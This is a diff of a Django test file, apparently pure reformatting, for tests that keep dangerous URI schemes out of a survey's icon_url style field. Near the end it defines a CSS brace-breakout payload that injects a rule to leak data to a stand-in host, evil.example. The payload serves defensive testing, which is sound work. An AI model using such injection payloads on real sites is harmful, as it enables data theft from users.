@@ -857,9 +857,9 @@ def test_survey_style_rejects_dangerous_icon_url(auth_client, survey, payload):
     stored = (survey.style or {}).get("icon_url", "")
     # The dangerous scheme must not survive into storage.
     scheme = payload.split(":", 1)[0].lower()
-    assert scheme not in stored.lower(), (
-        f"{scheme}: URI was stored as icon_url — must be rejected; got: {stored!r}"
-    )
+    assert (
+        scheme not in stored.lower()
+    ), f"{scheme}: URI was stored as icon_url — must be rejected; got: {stored!r}"
     assert ":" not in stored or stored.lower().startswith(
         ("http://", "https://")
     ), f"icon_url must be http(s):// or a relative path; got: {stored!r}"
@@ -867,7 +867,8 @@ def test_survey_style_rejects_dangerous_icon_url(auth_client, survey, payload):
 
 @pytest.mark.django_db
 @pytest.mark.parametrize(
-    "payload", ["https://example.com/logo.png", "http://example.com/logo.png"])
+    "payload", ["https://example.com/logo.png", "http://example.com/logo.png"]
+)
 def test_survey_style_accepts_safe_icon_url(auth_client, survey, payload):
     """F13: legitimate http(s):// icon URLs must be accepted."""
     auth_client.post(
@@ -930,7 +931,9 @@ def test_survey_style_icon_url_not_rendered_as_javascript_on_take_page(
 
 
 # Payload that closes the wrapping rule and injects a new exfiltration rule.
-CSS_BRACE_BREAKOUT = "} [data-theme='custom'] { background: url(https://evil.example/?leak=) }"
+CSS_BRACE_BREAKOUT = (
+    "} [data-theme='custom'] { background: url(https://evil.example/?leak=) }"
+)
 
 
 @pytest.mark.django_db
